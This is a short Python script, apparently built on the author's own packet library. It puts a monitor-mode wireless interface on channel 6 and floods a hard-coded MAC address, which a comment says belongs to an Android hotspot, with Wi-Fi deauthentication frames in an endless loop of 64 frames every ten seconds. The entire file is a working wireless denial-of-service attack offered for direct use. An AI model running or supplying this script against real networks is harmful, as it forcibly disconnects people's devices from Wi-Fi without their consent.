from time import sleep

from core.frame import DeauthenticationFrame
from core.sniffer import PacketSender
from utils.interface import change_channel

iface = "wlp4s0mon"
channel = 6

# random mac from android hot spot
frame = DeauthenticationFrame("a2:cf:2d:38:59:0c")

sender = PacketSender(iface)

change_channel(iface, channel)

while True:
    for _ in range(64):
        sender.send(frame.to_bytes())

    print(f"Sent 64 Deauth frames as {frame.bssid} to {frame.dest_addr}")
    sleep(10)
